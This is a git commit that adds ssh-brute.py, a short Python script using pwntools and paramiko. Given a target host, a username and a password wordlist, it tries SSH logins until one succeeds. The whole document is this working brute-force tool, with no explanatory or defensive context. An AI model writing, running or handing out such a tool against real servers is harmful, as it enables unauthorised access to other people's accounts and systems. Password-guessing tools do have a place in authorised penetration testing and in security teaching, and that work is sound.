783185445873217bfd8583489e88d481f684de6d
mridul027 <mridulpant027@gmail.com>
2023-02-07 04:21:04 -0500

    Initial commit

---
+++ ssh-brute.py
@@ -0,0 +1,23 @@
+from pwn import *
+import paramiko
+import sys
+
+host = sys.argv[1]
+username = sys.argv[2]
+attempts = 0
+pwd = sys.argv[3]
+
+with open(pwd, "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print("[{}] Attrempting password: '{}'!".format(attempts, password))
+            response = ssh(host=host, user=username, password=password, timeout=1) # only wait for 1 for authentication timeout
+            if response.connected():
+                print("[>] Valid password found: '{}'!".format(password))
+                response.close()
+                break
+            response.close()
+        except paramiko.ssh_exception.AuthenticationException:
+            print("[X] Invalid password!")
+        attempts+=1
